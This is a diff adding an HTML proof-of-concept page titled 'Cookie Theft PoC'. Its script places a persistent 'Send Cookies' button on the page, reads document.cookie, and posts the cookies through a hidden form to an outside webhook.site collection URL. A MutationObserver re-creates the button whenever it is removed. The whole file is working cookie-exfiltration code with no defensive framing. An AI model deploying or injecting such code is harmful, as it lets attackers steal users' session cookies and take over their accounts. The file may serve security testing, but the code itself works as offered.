@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Cookie Theft PoC</title>
+    <style>
+        .test-button {
+            display: block;
+            margin: 20px;
+            padding: 10px;
+            background-color: #007BFF;
+            color: white;
+            text-align: center;
+            cursor: pointer;
+            position: fixed;
+            top: 10px;
+            left: 10px;
+            z-index: 1000;
+        }
+    </style>
+</head>
+<body>
+    <h1>Cookie PoC</h1>
+
+    <script>
+        // Function to create and add the button to the page
+        function createButton() {
+            const button = document.createElement("button");
+            button.id = "myPersistentButton";
+            button.className = "test-button";
+            button.textContent = "Send Cookies";
+            document.body.appendChild(button);
+
+            button.addEventListener("click", () => {
+                sendCookies();
+            });
+
+            console.log("Button created and added to the page.");
+        }
+
+        // Function to send cookies using an invisible form
+        function sendCookies() {
+            const cookies = document.cookie;
+            if (cookies) {
+                // Create a form element
+                const form = document.createElement('form');
+                form.method = 'POST';
+                form.action = 'https://webhook.site/7b338adb-d9ef-4845-8d32-1745c78542b9/receive-cookies'; 
+                form.style.display = 'none'; // Hide the form from view
+
+                // Create a hidden input field for the cookies
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = 'cookies';
+                input.value = cookies;
+                form.appendChild(input);
+
+                // Append the form to the body and submit it
+                document.body.appendChild(form);
+                form.submit();
+
+                // Remove the form from the DOM after submission
+                setTimeout(() => document.body.removeChild(form), 1000);
+
+                console.log("Cookies sent via form submission.");
+            } else {
+                console.log("No cookies found.");
+            }
+        }
+
+        // Mutation observer to ensure the button persists
+        function observeMutations() {
+            const observer = new MutationObserver((mutations) => {
+                const button = document.getElementById("myPersistentButton");
+                if (!button) {
+                    createButton();
+                }
+            });
+
+            observer.observe(document.body, { childList: true, subtree: true });
+            console.log("MutationObserver started.");
+        }
+
+        // Initialize the script
+        createButton();
+        observeMutations();
+    </script>
+</body>
+</html>
